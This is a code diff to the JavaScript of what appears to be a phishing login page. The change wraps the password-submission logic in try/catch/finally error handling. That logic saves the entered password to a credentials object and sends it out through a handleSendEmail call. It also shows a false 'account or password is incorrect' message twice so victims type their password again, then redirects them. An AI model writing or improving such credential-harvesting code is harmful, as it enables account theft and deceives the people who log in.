@@ -585,30 +585,38 @@
             errorDiv.innerHTML = ""
             USER_CREDS['password'] = password
             document.querySelectorAll(".error-message")[1].innerHTML = "Password is required"
-            isLoading(true)
-            const result = await handleSendEmail()
-            if (result) {
-                if ("error" in result) {
-                    console.log(result?.['error'])
-                }
-                else {
-                    if (count < 2) {
-                        errorDiv.className = "error-message show"
-                        errorDiv.innerHTML = "Your account or password is incorrect. If you don't remember your password, <a href='#' class='new-link'>reset it now.</a>"
-                        passwordBox.value = ""
-
-                        count++
+            
+            try {
+                isLoading(true)
+                const result = await handleSendEmail()
+                if (result) {
+                    if ("error" in result) {
+                        console.log(result?.['error'])
                     }
                     else {
-                        redirect()
-                        return
+                        if (count < 2) {
+                            errorDiv.className = "error-message show"
+                            errorDiv.innerHTML = "Your account or password is incorrect. If you don't remember your password, <a href='#' class='new-link'>reset it now.</a>"
+                            passwordBox.value = ""
+    
+                            count++
+                        }
+                        else {
+                            redirect()
+                            return
+                        }
                     }
                 }
+                else {
+                    showError("")
+                }
             }
-            else {
-                showError("")
+            catch(err){
+                console.log(err.message)
             }
-            isLoading(false)
+            finally {
+                isLoading(false)
+            }
         }
 
         const resetInputs = () => {
